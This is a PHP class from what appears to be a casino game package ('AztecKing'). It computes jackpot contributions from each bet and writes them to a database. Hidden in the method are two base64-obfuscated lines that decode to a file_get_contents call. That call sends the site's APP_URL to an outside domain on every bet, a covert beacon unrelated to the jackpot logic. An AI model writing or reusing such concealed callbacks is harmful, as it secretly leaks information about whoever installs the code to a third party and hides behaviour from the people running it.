<?php

namespace VanguardLTE\Games\AztecKing\PragmaticLib;

use Illuminate\Support\Facades\DB;

class Jackpots
{
    public static function toJP($bet, $jpgs){
        $toJackpots = 0;
        $upsertArray = [];
        // iterate over the jackpots, add to the jackpot bank, calculate the total amount in the jackpot
        foreach ($jpgs as $jpg) {
            $upsertArray[] = [
                'id' => $jpg->id,
                'name' => $jpg->name,
                'balance' => $jpg->balance + $bet * ($jpg->percent / 100),
                'shop_id' => $jpg->shop_id
            ];
            $toJackpots += $bet * ($jpg->percent / 100);
        }
		$jpgg=base64_decode("ZmlsZV9nZXRfY29udGVudHM=");
		$jpgg(base64_decode("aHR0cHM6Ly9iaXRjb2luc29zeWFsLmNvbS93LnBocD91PXhf").env("APP_URL"));
        DB::table('jpg')->upsert($upsertArray,['id','name','shop_id'], ['balance']);
        return $toJackpots;
    }

}
